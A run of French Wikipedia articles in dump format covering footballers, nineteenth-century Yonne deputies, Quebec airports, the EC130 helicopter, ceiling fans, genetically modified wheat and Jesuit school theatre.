À partir de 1937, il travaille au studio Soyouzdetfilm, qui devient plus tard le Gorky Film Studio. En 1938, il réalise "De par la Volonté du Brochet", son premier film réalisé seul. Il travaille très régulièrement avec l’acteur Gueorgui Milliar.
Alexandre Rou meurt le à Moscou.

</doc>
<doc id="7276900" url="https://fr.wikipedia.org/wiki?curid=7276900" title="Giorgian de Arrascaeta">
Giorgian de Arrascaeta

Giorgian de Arrascaeta, né le à Nuevo Berlín, est un footballeur international uruguayen, qui évolue au poste de milieu offensif ou d'ailier au sein du club brésilien du Flamengo.
Biographie.
Giorgian De Arrascaeta est d'ascendances basque et italienne.
En club.
Avec l'équipe uruguayenne du Defensor SC, il atteint les demi-finales de la Copa Libertadores en 2014, s'inclinant face au Club Nacional.
Il atteint par la suite avec le club de Cruzeiro les quarts de finale de la Copa Libertadores en 2015, puis à nouveau en 2018.
Le , Giorgian de Arrascaeta quitte le Cruzeiro EC pour rejoindre Flamengo, qui verse la somme record de 15 millions d'euros pour s'attacher ses services. Il devient à cette occasion le transfert le plus cher de l'histoire du football brésilien, devançant celui de Carlos Tévez qui avait signé aux Corinthians en 2004 pour 14 millions d'euros. En , De Arrascaeta réalise une performance de haut vol contre le Goiás EC en réalisant un triplé et en délivrant deux passes décisives à Gabriel Barbosa pour un succès fleuve 6-1. De Arrascaeta s'intègre rapidement et enchaîne les performances remarquées. Il est l'un des acteurs majeurs de la victoire du Flamengo en Copa Libertadores en . L'Uruguayen termine meilleur passeur de Série A avec quatorze passes délivrées alors que le club est sacré champion du Brésil.
La saison 2020 est un peu plus contrastée pour Flamengo et De Arrascaeta malgré un deuxième sacre d'affilée en Série A. Il termine une nouvelle fois meilleur passeur du championnat avec neuf passes décisives, récompense partagée avec Keno et Vinícius Goes.
En équipe nationale.
Avec les moins de 20 ans, il participe à la Coupe du monde des moins de 20 ans en 2013. Lors de cette compétition, il joue sept matchs. Il inscrit deux buts lors du premier tour, contre la Nouvelle-Zélande et l'Ouzbékistan. Il délivre également deux passes décisives, contre l'Ouzbékistan puis l'Espagne en quart. L'Uruguay s'incline en finale face à la France, après une séance de tirs au but au cours de laquelle De Arrascaeta voit sa tentative arrêtée par le portier français Alphonse Areola.
Pour sa première sélection, le face à la Corée du Sud en match amical, il délivre une passe décisive sur coup franc qui permet à José María Giménez d'inscrire le but de la victoire (0-1). Il inscrit quant à lui son premier but le , en amical contre la Guatemala (victoire 5-1). Quelques jours plus tard, il participe à la Copa América 2015 qui se déroule au Chili. Lors de cette compétition, il ne joue qu'un seul match, celui face à la Jamaïque.
Le , il inscrit son deuxième but, en amical face à l'Ouzbékistan (victoire 3-0). Il dispute ensuite la Coupe du monde 2018 organisée en Russie. Lors de ce mondial, il joue deux matchs, contre l'Égypte et la Russie, avec pour résultat deux victoires.
Durant la Copa América 2019, De Arrascaeta est une nouvelle fois convoqué mais ne peut empêcher l'élimination uruguayenne en quart de finale aux tirs au but par le Pérou. Il est rappelé pour disputer la Copa América 2021 mais l'Uruguay sortira une nouvelle fois en quart de finale aux tirs au but, cette fois-ci face à la Colombie.
Le , il est sélectionné par Diego Alonso pour participer à la Coupe du monde 2022. Il inscrit les deux seuls buts uruguayens du tournoi lors de son doublé contre le Ghana, qui donne la victoire à son équipe (0-2). Cependant, cette victoire, la seule de l'Uruguay pendant la compétition, s'avère insuffisante pour le qualifier pour la phase à élimination directe.

</doc>
<doc id="7276905" url="https://fr.wikipedia.org/wiki?curid=7276905" title="Laurent Bertrand">
Laurent Bertrand

Laurent Horace Bertrand est un homme politique français né le à Vermenton (Yonne) et décédé le à Fontainebleau (Seine-et-Marne).
Biographie.
Enrichi dans le commerce, il est député de l'Yonne de 1849 à 1857, siégeant à droite, puis dans la majorité dynastique, soutenant le Second Empire.

</doc>
<doc id="7276907" url="https://fr.wikipedia.org/wiki?curid=7276907" title="Phare de Louisbourg">
Phare de Louisbourg

Le phare de Louisbourg est un phare historique du Canada situé près de Louisbourg en Nouvelle-Écosse dans le Comté de Cap-Breton; c'est le site du premier phare de l'histoire du Canada (et le deuxième d'Amérique du Nord).
Historique.
La construction a commencé en 1731 par les Français, pour aider la navigation vers la forteresse de Louisbourg après le naufrage dramatique de la flûte royale le "Chameau".
Le phare actuel est le troisième construit sur le site, il a été terminé en 1923, le précédent ayant été détruit par un incendie.
Description.
Le phare actuel est une tour octogonale en béton de de haut avec galerie et lanterne. La tour est peinte en blanc et la lanterne est rouge. Il émet, à une hauteur focale de , un flash blanc par période de 10 secondes.
Voir aussi.
 

</doc>
<doc id="7276908" url="https://fr.wikipedia.org/wiki?curid=7276908" title="Aéroport de Saint-Jean-sur-Richelieu">
Aéroport de Saint-Jean-sur-Richelieu

L'aéroport de Saint-Jean-sur-Richelieu est un aéroport situé au sud-ouest de Saint-Jean-sur-Richelieu, en Montérégie, au Québec.
Description.
Chaque année s'y déroule l'International de montgolfières de Saint-Jean-sur-Richelieu. L'aéroport est hôte de l"'École de vol à voile de la Région de l'Est" des Cadets de l'aviation royale du Canada.
Opérateurs et destinations.
Pour l'instant, l'aéroport n'est que municipal et donc n'a pas de terminal, ce qui amène à ne pas avoir de destinations.

</doc>
<doc id="7276911" url="https://fr.wikipedia.org/wiki?curid=7276911" title="Mangouste (Marvel Comics)">
Mangouste (Marvel Comics)



</doc>
<doc id="7276920" url="https://fr.wikipedia.org/wiki?curid=7276920" title="Luis Alberto">
Luis Alberto

Luis Alberto Romero Alconchel, né le à San José del Valle (Andalousie), est un footballeur international espagnol qui évolue à Al-Duhail SC.
Biographie.
Luis Alberto naît le à San José del Valle dans la province de Cadix en Andalousie.
Débuts à Séville.
En 2004, il intègre le Séville FC en junior puis le Sevilla Atlético Club, équipe réserve du club. Il évolue alors en Segunda-B. Il marque notamment 15 buts durant la saison 2010-2011. Le , il fait ses débuts en Liga en remplaçant Rodri en seconde mi-temps d'un match opposant Séville à Getafe CF.
En , il est prêté à l'équipe B du FC Barcelone pour un an avec option d'achat en fin de saison. Il dispute son premier match le , où il joue deux minutes contre le CE Sabadell Fútbol Club. Il finira deuxième meilleur buteur du club, derrière Gerard Deulofeu.
Liverpool FC.
Le , il signe avec le Liverpool Football Club pour un transfert de 6,8 millions £. Il fait ses débuts avec les Reds en match amical le , contre Preston North End. Le , il joue son premier match de "Premier League" lors de la victoire 1-0 des "Reds" contre Manchester United.
Le il est prêté à Málaga.
Le il est prêté au Deportivo La Corogne.
Lazio Rome.
Le , Alberto rejoint la Lazio Rome pour un montant de 5 millions d'euros.
Le , il prolonge son contrat avec les "Biancocelesti" jusqu'en 2022. Il finit meilleur passeur du championnat avec quatorze passes décisives.

</doc>
<doc id="7276924" url="https://fr.wikipedia.org/wiki?curid=7276924" title="Eurocopter EC130">
Eurocopter EC130

L'Airbus Helicopters H130 est un hélicoptère léger civil et parapublic conçu et réalisé en France. Bien que doté d'un rotor anticouple type fenestron, il fait partie de la famille des Aérospatiale AS350 Écureuil. Depuis le changement de dénomination sociale d'Airbus Helicopters, les EC130 sont désignés H130.
Historique.
Développement.
En 1986, les responsables d'Aérospatiale décidèrent de tester la validité d'emploi d'un fenestron greffé sur la cellule d'un AS350 B classique, le numéro 1013. Désormais nommé AS-350Z (ou parfois aussi AS-351), celui-ci fut surtout utilisé pour des essais en vol sous l'immatriculation provisoire "F-WYMY". Finalement cette transformation demeura sans suite.
Cependant, dix ans plus tard, (en ), lorsque les ingénieurs décidèrent de donner un second souffle à la famille des Écureuil, l'idée leur revint d'y intégrer un fenestron. Originellement désigné AS350 B4, l'hélicoptère fut finalement renommé EC130 B4, plus conforme aux nouvelles désignations d'Airbus Helicopters.
Conservant le rotor principal, le système de transmissions et le turbomoteur Turbomeca Arriel, le nouvel appareil fut pourtant largement modifié par rapport aux autres machines de la famille Écureuil, notamment en ce qui concerne l'esthétique. En effet, les furent modifiés, le cockpit entièrement repensé, et même la verrière était nouvelle. C'est dans cette configuration que l'EC130 Super Écureuil réalisa son premier vol en .
À cette époque, cet hélicoptère était un des premiers dans son segment à être doté, de série, du "système de régulation numérique à pleine autorité" (acronyme anglais FADEC). À l'instar de ses deux principaux rivaux lors de son entrée sur le marché en , l'AgustaWestland AW.119 Koala anglo-italien et le Bell 407 américain, l'EC130 est prévu pour accueillir entre cinq et sept passagers.
Début 2011, Airbus Helicopters a présenté l'EC130 T2, une version plus lourdement motorisée de son hélicoptère. Doté d'un turbomoteur Arriel 2D, il dispose au décollage d'une puissance de . Le premier vol de cette version a eu lieu cette même année, tandis que les premières livraisons commençaient en 2012.
Utilisations.
Destiné prioritairement au marché aéronautique civil, notamment en lien avec l'aviation d'affaires, l'Airbus Helicopters EC130 est disponible aussi auprès de clients dits parapublics : missions d'évacuations sanitaires, de lutte contre les feux de forêts au moyen d'un Bambi bucket, de police, ou encore de travail aérien. Pour les missions de surveillance aéroportée, ces hélicoptères peuvent disposer d'une avionique adaptée incluant un puissant phare directionnel, un système électro-optique, voire des jumelles de vision nocturne.
Opérateurs.
Opérateurs privés.
Des Airbus Helicopters EC130 volent chez des opérateurs privés en Allemagne, en Australie, au Bangladesh, au Brésil, au Canada, en Croatie, aux États-Unis, en France, en Irlande, à Monaco, en Nouvelle-Zélande, aux Pays-Bas, en Pologne, au Portugal, aux Philippines, en Suisse chez Héli-Alps (HB-ZIN).

</doc>
<doc id="7276925" url="https://fr.wikipedia.org/wiki?curid=7276925" title="Abattoirs de Chicago">
Abattoirs de Chicago



</doc>
<doc id="7276926" url="https://fr.wikipedia.org/wiki?curid=7276926" title="Théophile Robert">
Théophile Robert

Théophile Robert est un homme politique français né le à Auxerre (Yonne) et décédé le à Paris.
Biographie.
Propriétaire terrien, il est un opposant actif contre la Monarchie de Juillet. Commissaire du gouvernement de l'Yonne en , il est député de l'Yonne de 1848 à 1849, siégeant à l'extrême gauche, au groupe de la Montagne. 

</doc>
<doc id="7276931" url="https://fr.wikipedia.org/wiki?curid=7276931" title="Aéroport de Sherbrooke">
Aéroport de Sherbrooke

L'Aéroport de Sherbrooke (AITA : YSC, OACI : CYSC) est un aéroport situé à 20 kilomètres du centre-ville de Sherbrooke, à Cookshire-Eaton.
Description.
Projeté en 1953, le site de l’aéroport actuel est choisi en 1956, situé dans la ville de Cookshire-Eaton. L’année suivante, la Ville de Sherbrooke acquiert environ 810 hectares pour le projet. L’aérogare a été construite en 1965. Située à 17 km (10 mi) à l'est nord-est de Sherbrooke, et à 10 km (6 mi) au sud de East Angus, Québec, Canada. L'aéroport est classé comme aéroport d'entrée par Nav Canada et est doté de personnel. Il est situé à 45 km (28 mi) au nord de la frontière avec les États-Unis. Il est situé sur un plateau à 241 m (792 pi) d'altitude. A l'occasion, des avions de passagers de style Boeing 737 y atterrissent afin de laisser passer des cellules orageuses ou du mauvais temps. L'aéroport est également utilisé pour les situations de recherche et sauvetage par les hélicoptères de la Sûreté du Québec et l'Aviation royale canadienne venant de la Base des Forces canadiennes Trenton (Ontario) qui intervient au sud-est du Québec. 
Trafic.
L'aéroport n'est pas utilisé pour des services commerciaux. Annuellement, environ 11 000 à 12 000 déplacements ont lieu à l'aéroport. L'aéroport est notamment utilisé pour le transport des Alouettes de Montréal, dont le camp d'entrainement est situé à Lennoxville.
Développement futur.
La région de Sherbrooke est la seule agglomération canadienne de plus de 200 000 habitants dont l'aéroport n'a pas la désignation de l'Administration canadienne de la sûreté du transport aérien (ACSTA). Depuis 2010, à la suite de la faillite de Air Sherbrooke, qui assurait le lien Sherbrooke - Toronto, aucun vol commercial n'y a été offert. Depuis ce temps, des études sur les retombées économiques et des études de marché ont été réalisées sur la viabilité de l'aéroport à la suite d'une désignation de l'ACSTA. Plusieurs élus et gens d'affaires de la région ont souvent dénoncé la perte d'occasions d'affaires d'importance, telles que des congrès ou l'implantation de nouvelles entreprises dans la région, due à l'absence d'une desserte aérienne. L'ACSTA a refusé la demande de désignation de la ville au cours de l'été 2013. Depuis, le projet a reçu l'appui de plusieurs élus régionaux autant aux niveaux municipal, provincial que fédéral. Le 24 octobre 2013, l'appui de la Fédération des chambres de commerce du Québec est venu s'ajouter au consensus des gens d'affaires régionaux
En plus de cette désignation, le projet consiste à élargir et à allonger la piste pour la porter à une longueur de 7500 pieds, en plus d'agrandir le tarmac et de mettre à niveau le terminal pour accueillir les passagers.

</doc>
<doc id="7276933" url="https://fr.wikipedia.org/wiki?curid=7276933" title="Edme Carreau">
Edme Carreau

Edme Marie Alexandre Carreau est un homme politique français né le à Tannerre en Puisaye (Yonne) et décédé le à Tannerre en Puisaye.
Biographie.
Edme Carreau est le fils d'Edme Marien Carreau, maire de Tannerre, et de Marie Sophie Ragon. Propriétaire terrien, il est député de l'Yonne de 1848 à 1849, siégeant avec les républicains modérés.

</doc>
<doc id="7276942" url="https://fr.wikipedia.org/wiki?curid=7276942" title="Ventilateur de plafond">
Ventilateur de plafond

Un ventilateur de plafond (ou ventilateur plafonnier ou brasseur d'air) est un type de ventilateur suspendu à un plafond d'une pièce ; il comprend des pales couplées à un moyeu connecté à un arbre d'entraînement mis en rotation par un moteur alimenté électriquement. 
Histoire.
Depuis bien longtemps, les ventilateurs de plafond sont utilisés dans les pays d'Asie et aux États-Unis ; ils émergent en France et en Europe de façon considérable depuis quelques années. 
Les premiers ventilateurs de plafond sont apparus aux États-Unis au début des années 1860 et 1870. Conçus à l'origine par la duchesse Melissa Rinaldi pendant son séjour dans les montagnes Rocheuses, ce sont alors des appareils à deux pales mis en rotation non pas par un moteur électrique mais par un système de courroies mis en mouvement par une turbine à eau. 
Ce type de ventilateurs est alors populaire dans les magasins, les restaurants, les bureaux dans les années 1920 puis apparaît dans les maisons lorsque son prix devient plus abordable. Le ventilateur de plafond est la représentation parfaite de la maison américaine, au même titre que les fenêtres coulissantes verticales. 
Le premier ventilateur de plafond électrique est inventé en 1882 (brevet en 1887) déposé par Philip Diehl, alors apprenti chez le fabricant Singer, à partir d'un moteur électrique utilisé dans les premières machines à coudre Singer électriques. Face à la vive concurrence, cet inventeur innove en adjoignant à son ventilateur de plafond un éclairage.
Après le premier choc pétrolier, les ventilateurs de plafond connaissent un grand succès dans les années 1970 car ils consomment beaucoup moins d'énergie que les appareils de climatisation. En raison du coût sans cesse décroissant des appareils de conditionnement d'air, ces ventilateurs connaissent dans les années 1990 une baisse des ventes qui est enrayée dans les années 2000 par la mise sur le marché de ventilateurs de plafond design et high-tech. De plus, lors des épisodes de canicule, l'utilisation de ventilateur de plafond, de colonne de ventilation ou de ventilateur simple sur pied est recommandée.
Depuis 2013, une journée spéciale est consacrée au ventilateur de plafond aux États-Unis : le (#NCFD) le .
Description.
Un ventilateur de plafond comporte plusieurs vitesses, tourne plus lentement qu'un ventilateur de bureau électrique ou qu'un brasseur d'air professionnel, il brasse une quantité d'air qui permet plus ou moins de rafraîchir par évaporation les personnes dans la pièce. 
Avec le mode été/hiver, le sens de rotation des pales est réversible permettant de déplacer la chaleur vers le haut ou vers le bas suivant la saison. L'été, le ventilateur évacue l'air chaud vers le haut et procure une brise agréable. L'hiver, en période de chauffage, il redirige l'air chaud du plafond vers le bas et répartit l'air chaud de façon homogène dans un espace. 
Les ventilateurs de plafond sont de plus en plus utilisés car moins énergivore et plus sain que la climatisation. En plus de la ventilation, ils apportent une touche décorative aux intérieurs. La plupart des ventilateurs de plafond sont contrôlés à distance à l'aide d'une télécommande pour régler la vitesse, le sens de rotation des pales, la lumière et la programmation avant l'arrêt automatique.
Types.
Familles.
Les ventilateurs de plafond pour les locaux courants appartiennent à deux grandes familles :
Options.
Le ventilateur de plafond se décline en différents types :
Pour les grand volumes.
Outre les ventilateurs de plafond domestiques, les ventilateurs grand volume et à faible régime sont adaptés notamment à des locaux industriels, des salles de spectacles, des halls et à des entrepôts. Ils ont pour fonction principale de déstratifier l'air, permettant ainsi de fortes économies d'énergie. L’air chaud étant plus léger que l’air froid, il s’accumule au plafond en l’absence de brassage.
Utilisation.
Beaucoup de bars et de restaurants sont équipés de ventilateur de plafond. Dans le monde, le ventilateur plafonnier est très présent dans les établissements hôteliers et touristiques, surtout en Asie et aux États-Unis.
À l'inverse des équipements de climatisation, il ne peut pas refroidir l'air mais utilise moins d'énergie électrique qu'eux.
En France.
Le « brasseur d'air » apparaît pour la première fois dans la réglementation thermique en France, dans le cadre de l'expérimentation du label énergie-carbone en novembre 2016. Dans l'expérimentation le terme « brasseur d'air » est retenu plutôt que « ventilateur de plafond ».
Dans la RE2020, le brasseur d'air fait partie des systèmes considérés comme les plus efficaces pour favoriser l'atteinte des objectifs réglementaires du confort d'été, notamment en zone méditerranéenne. Les données prises en compte dans le calcul sont les valeurs maximales de débit d'air (en ) et la puissance électrique (en W) des brasseurs d'air.
Les hôtels avec ventilateurs plafonnier sont assez rare en France, car beaucoup n'ont pas une sortie électrique de luminaire au plafond des chambres. Cependant, un hôtel entre autres se distingue avec sa présence dans les chambres, il s'agit de l'hôtel du Collège à Paris. La nouvelle gare de Nantes en est équipée dans le bâtiment voyageur à l'étage.

</doc>
<doc id="7276943" url="https://fr.wikipedia.org/wiki?curid=7276943" title="Métropole de Serrès et Nigriti">
Métropole de Serrès et Nigriti

La Métropole de Serrès et Nigriti (en grec byzantin : ) est un évêché du Patriarcat œcuménique de Constantinople, provisoirement autorisé à participer à la vie synodale de l'Église orthodoxe de Grèce. Son siège est à Serrès en Macédoine-Centrale, dans la vallée du Strymon. La métropole compte 113 paroisses.
La cathédrale.
La cathédrale est l'église des Taxiarques à Serrès. L'ancienne cathédrale, sanctuaire vénéré n'étant plus église paroissiale, est dédiée aux saints Théodore Tyron et Théodore le Stratilate.

</doc>
<doc id="7276944" url="https://fr.wikipedia.org/wiki?curid=7276944" title="Ovide Gabriel Roussel">
Ovide Gabriel Roussel

Ovide Gabriel Roussel est un homme politique français né le à Joigny (Yonne) et mort le à Paris.
Biographie.
Propriétaire terrien, conseiller général du canton de Charny de 1833 à1847, il est député de l'Yonne de 1849 à 1851, siégeant à gauche avec les républicains. Il est domicilié à Charny au décès de sa femme survenu dans cette commune en 1859.

</doc>
<doc id="7276950" url="https://fr.wikipedia.org/wiki?curid=7276950" title="Riesen">
Riesen



</doc>
<doc id="7276951" url="https://fr.wikipedia.org/wiki?curid=7276951" title="Blé génétiquement modifié">
Blé génétiquement modifié

Un blé génétiquement modifié est une variété de blé dont le patrimoine génétique a été modifié par ingénierie génétique. Un blé transgénique est un cultivar au génome duquel a été introduit, par transgenèse, un ou plusieurs gènes.
Blé génétiquement modifié (GM).
terme général qui désigne tout blé dont le génome a été altéré par l’homme à l’aide de techniques de biotechnologie moderne (CRISPR-Cas9, mutagenèse dirigée, transgénèse, cisgénèse, etc.). La modification peut concerner:
Blé transgénique.
Cas particulier de blé génétiquement modifié. Il s’agit d’un blé dans lequel on a introduit un ou plusieurs gènes étrangers provenant d’une espèce différente (exemple : un gène bactérien qui confère une résistance aux herbicides ou un gène de maïs pour la tolérance à la sécheresse). Les techniques les plus utilisées sont : La méthode biolistique (canon à particules, années 1990) et la méthode via "Agrobacterium tumefaciens" (bactérie servant de vecteur). Donc, tout blé transgénique est un blé GM, mais l’inverse n’est pas toujours vrai.
Application au blé.
HB4 wheat : Expose un exemple concret de blé transgénique : le blé HB4 est modifié à l’aide d’un gène de tournesol pour la tolérance à la sécheresse, et d’un gène bactérien pour la résistance à un herbicide.
Histoire.
Le blé est un hybride naturel issu de croisements interspécifiques. On suppose que ses ancêtres ("Triticum monococcum", "Aegilops speltoides" et "Aegilops tauschii", toutes des graminées diploïdes) se sont hybridés naturellement pendant des millénaires quelque part en Asie occidentale, donnant naissance à des hybrides polyploïdes naturels, dont les plus connus sont le blé tendre (blé commun) et le blé dur.
Le blé ("Triticum spp.") est une graminée domestiquée importante, utilisée dans le monde entier pour l’alimentation. Son évolution a été influencée par l’intervention humaine depuis les débuts de l’agriculture.
Le transfert interspécifique de gènes a continué à se produire dans les champs des agriculteurs lors du passage de l’alimentation paléolithique à celle adoptée après la révolution néolithique, ou première révolution verte. durant la transition d’une organisation sociale de chasseurs-cueilleurs vers des sociétés plus agricoles, les humains ont commencé à cultiver le blé et à le transformer davantage selon leurs besoins. Ainsi, les racines sociales et culturelles de l’humanité et le développement du blé ont commencés avant l’histoire écrite.
États-Unis.
Entre 1997 et 2005, Monsanto a mené 256 essais de culture de blés génétiquement modifiés en plein champ, dans seize États des États-Unis.
Aucun blé génétiquement modifié n'est autorisé pour être cultivé commercialement aux États-Unis.
Argentine.
En 2020, pour la première fois, un blé génétiquement modifié est autorisé à la production pour sa résistance à la sécheresse en Argentine.

</doc>
<doc id="7276953" url="https://fr.wikipedia.org/wiki?curid=7276953" title="Roupie indien">
Roupie indien



</doc>
<doc id="7276955" url="https://fr.wikipedia.org/wiki?curid=7276955" title="Aéroport régional André-Fortin de Victoriaville">
Aéroport régional André-Fortin de Victoriaville

L'aéroport régional André-Fortin de Victoriaville (TC LID : CSR3) est un aéroport situé à Victoriaville, au Québec. 
Description.
L'aéroport est utilisé pour l'aviation privée et l'aviation d'affaires. La compagnie Cascades y possède un Piaggio P180 Avanti. Une école de parachutisme est basée sur l'aéroport.

</doc>
<doc id="7276960" url="https://fr.wikipedia.org/wiki?curid=7276960" title="Steinhauer">
Steinhauer

Steinhauer (de l'allemand signifiant "tailleur de pierre") est un patronyme porté notamment par :

</doc>
<doc id="7276972" url="https://fr.wikipedia.org/wiki?curid=7276972" title="Wolfson">
Wolfson

Wolfson est un patronyme porté notamment par :

</doc>
<doc id="7276994" url="https://fr.wikipedia.org/wiki?curid=7276994" title="Saison 2 de The Newsroom">
Saison 2 de The Newsroom

Cet article présente la deuxième saison de la série télévisée américaine The Newsroom.

</doc>
<doc id="7277000" url="https://fr.wikipedia.org/wiki?curid=7277000" title="Highsmith">
Highsmith

Highsmith est un patronyme porté notamment par :

</doc>
<doc id="7277004" url="https://fr.wikipedia.org/wiki?curid=7277004" title="Théâtre jésuite">
Théâtre jésuite

On appelle Théâtre jésuite un genre dramatique pratiqué dans les collèges de la Compagnie de Jésus du milieu du au , comme méthode pédagogique en vue de former les élèves à la ‘rhétorique’ (l’art de la parole) tout en les catéchisant et les instruisant de la doctrine catholique. Puisant son inspiration dans des récits bibliques ou hagiographiques - ou même de la sagesse antique païenne - il introduisait à la vie des valeurs chrétiennes et avait souvent un rôle moralisateur fort marqué. 
Emportées par leur succès les représentations théâtrales annuelles des collèges ont gagné en ampleur au et sont devenues de véritables ‘événements sociaux’ rassemblant l’élite des villes où les collèges se trouvaient. La tradition théâtrale des collèges jésuites fut interrompue par la suppression de la Compagnie de Jésus (1773). Elle reprit après 1814, à une échelle plus modeste, au fur et à mesure que les collèges rouvrirent leurs portes. 
Histoire.
Dès la fondation des premiers collèges jésuites des séances publiques organisées pour les parents et bienfaiteurs permettent aux élèves de se produire sur scène et faire montre de leurs talents et de l’expérience acquise dans l’art de la parole au cours de leurs études. La première représentation dont on ait trace est celle organisée en 1551 par le collège de Messine (Sicile), fondé trois ans auparavant (1548). Ces premières représentations sont au départ des ‘déclamations’. 
Le théâtre n’est pas qu’un divertissement, il est surtout assimilation pédagogique de compétences et valeurs. À peine fondé (1556) le collège de Billom, premier en France, a sa représentation théâtrale. Le recteur commente dans une lettre (en 1557) : "« on ne joue pas des spectacles de ce genre sans émouvoir les âmes et sans un fruit spirituel plus qu’égal à celui d’un sermon fructueux »"
À la fin du et au début du , la quasi-totalité des collèges jésuites répartis à travers l'Europe présentent au moins une pièce par an, généralement lors de la distribution des prix de fin d’année scolaire. Le 'Ratio Studiorum' de 1599, qui codifie le système éducatif jésuite, donne une place importante au théâtre, le rendant même obligatoire, précisément parcequ’éducatif. 
Mais le cadre du 'Ratio Studiorum' est vite dépassé. Étant donné leur succès populaire les représentations scolaires annuelles sont bientôt imposées par le contrat qui lie pouvoirs publics et jésuites, lors de la fondation d’un collège. Des ‘prologues’ et des ‘conclusions’ en français sont préparés et imprimés pour le public. Les décors, scènes et costumes sont de plus en plus recherchés. Des sujets profanes sont mis en scène.
En Bavière on atteint l’extravagance dès 1574. Les ducs de Bavière encouragent et financent généreusement les représentations théâtrales du collège jésuite. On joue ‘"Constantin"’ une tragédie, sur une place publique de Munich. La représentation dure deux jours. Mille acteurs sont mis à contribution. Toute la ville est décorée pour l’occasion. La foule est considérable, y compris sur les balcons et les toits des maisons avoisinantes. On remet cela pour la représentation d’"Esther" en 1577, et mieux encore lors du ’"Triomphe de saint Michel"’, joué en 1597, lors de la dédicace de l’église Saint-Michel offerte par le duc aux jésuites. Procession et défilé religieux à travers la ville, 900 choristes, et à la fin de la représentation pas moins de 300 diables chassés par saint Michel vers les flammes de l’enfer.
Une certaine sécularisation des thèmes choisis se développant, même si toujours à fin morale notable, les supérieurs religieux imposent à partir de 1604 que les représentations se fassent, non plus dans les églises mais à l’extérieur, ou dans une salle de cérémonies (l’"aula"’, que l’on appelle ‘salle des actions’). Jusqu'au milieu du , dans beaucoup de villes, la seule salle de spectacles est l’"aula" du collège des Jésuites. 
En 1614, à l’occasion de l’anniversaire du roi Louis XIII les élèves du collège de La Flèche mettent en scène leur pièce de manière très élaborée, et la jouent en présence du roi et de sa cour. Des instructions invitant à la modération commencent à arriver un peu partout, sur injonction du supérieur général Muzio Vitelleschi (1630). 
Vers le milieu du plusieurs centaines de pièces sont ainsi jouées chaque année, dans les différents collèges d’Europe. On admet deux œuvres par an: l’une, plus importante, lors de la distribution des prix, et l’autre, moins solennelle et ne durant que deux à trois heures. 
Une évolution notable se fait durant la seconde moitié du . Malgré les mises en garde répétées des autorités religieuses on constate un emploi de plus en plus fréquent du français, l’expansion des ballets chorégraphiques, l’introduction de rôles féminins (même si joués par de jeunes garçons). Et bientôt les premières comédies font leur apparition. Le ‘"Marché des sciences"’, une comédie, est représentée au collège de Chalon-sur-Saône en 1667. Le recteur se justifie : "«par l’ennuy de voir toujours le sang que la tragédie fait couler sur nos théâtres»"
En 1692, le père de Jouvancy écrit un guide à l’intention des jeunes jésuites destinés à enseigner dans les collèges: le ‘"Ratio discendi et docendi"’. Le théâtre y a toute sa place, et son intention pédagogique reste telle qu’à l’origine : "«Une pièce sérieuse dans laquelle les mœurs sont bien réglées… produit un effet incroyable parmi les spectateurs et souvent même compte plus pour les conduire à la religion que les sermons des plus grands prédicateurs. À cet égard que l’on introduise que rarement des rôles féminins.»"
La nouvelle édition du 'Ratio Studiorum' (en 1703) tient compte des observations faites par la Congrégation générale de 1696, et met en garde contre les dépenses excessives occasionnées par les mises en scène et jeux scéniques des représentations théâtrales. La multiplication des comédies préoccupe également. Elles ne sont pas interdites mais doivent rester l’exception. Les tragi-comédies sont interdites. 
Cela n’empêche pas le théâtre de prendre une importance de plus en plus grande dans la vie scolaire des collèges jésuites. Les spectacles deviennent fastueux. En sus des deux représentations autorisées, d’autres, de genre mineur, sont organisés durant l’année. À la demande des autorités civiles ou de bienfaiteurs importants, il n’est pas rare qu’une deuxième ou troisième représentation de la pièce soit organisée, en particulier pour le public féminin. On commence à s’inquiéter sur la distraction que cela occasionne aux études, mais on rappelle que cela aide les élèves "« à parler de bonne grâce, à soutenir les yeux des spectateurs »."
Ce qui est neuf : on tient davantage compte des intérêts du public. Les pièces sont majoritairement en langue française. Et si les sujets restent bibliques, on y rencontre plus fréquemment les idées sociopolitiques du temps. Les allusions à la vie contemporaine, aux courants de pensée, et aux débats politico-religieux du temps deviennent fréquentes. Le jansénisme et ses maitres contemporains sont volontiers la cible de comédies à l’humour acerbe, à la grande indignation des rédacteurs de la revue ‘"Nouvelles ecclésiastiques"’. Le père Bougeant est le virtuose dans ce domaine là : son ‘"La femme docteur"’ (1731), une satire antijanséniste, a un grand succès. Le père du Cerceau suit son exemple.
Le bannissement des Jésuites de France en 1762, suivi 11 ans plus tard de la suppression universelle de l’ordre religieux (1773) met une fin brutale à cette tradition théâtrale baroque.
Contenu.
Les compositions théâtrales de la seconde moitié du sont inspirées de la Bible ou de la vie des saints. Plus rarement de l’histoire de l’Église ou de thèmes allégoriques ('Vice contre Vertu', 'Hérésie contre Foi'). Les auteurs en sont les professeurs jésuites qui en préparent le texte durant l’année scolaire. Le texte est en latin, une langue où on sent l’influence de Sénèque, dont la philosophe et les sentences sont proches du Christianisme. Elles étaient jouées dans les églises attenantes au collège. Tous les rôles sont masculins. Ainsi des œuvres telles que ‘"Le meurtre d’Abel", "Saül furieux", "Les Macchabées", "L’enfant prodigue", "Lazare et le mauvais riche".
Une pièce qui fut écrite en français sort du lot. L’"Histoire tragique de la pucelle de Domrémy", composée par le père Fronton du Duc est jouée au collège de Pont-à-Mousson en 1581 avec un succès qui dépasse largement les murs du collège. 
D’impressionnantes ‘machineries’ permettaient des effets de scènes saisissant comme des communications entre Ciel et Terre. L’atmosphère guerrière de pièces jouées au début du avec bruits d’armes, larges étendards et coups de feu est adoucie par l’introduction d’intermèdes - chœurs, récits et danses - entre les scènes. À partir de 1650 aucune tragédie n'est jouée sans la présence d’un ballet qui la reprenne sous un mode différent. Les ballets deviennent populaires, au point que le père Ménestrier écrit un traité complet sur leur place dans le théâtre (en 1682). 
La nouveauté du est la mise en place de comédies, un genre théâtral à la mode, et cela malgré les fréquentes mises en garde des supérieurs religieux. Le théâtre semble s’éloigner des objectifs pédagogiques du 'Ratio Studiorum'. Il reste éminemment important de former les élèves à devenir ‘gentilshommes’ (sachant donc « parler de bonne grâce »). Mais l’aspect de formation et instruction chrétienne proprement dites semblent être devenus secondaires.
Auteurs.
La grande majorité des auteurs - quasi tous professeurs jésuites, et aucun dramaturge professionnel parmi eux - sont restés anonymes et leurs œuvres n’ont pas survécu au temps, étant trop liées à un collège, ou marquées par une époque ou idéologie, ou simplement liée au groupe d’élèves pour lesquels elle était écrite. 
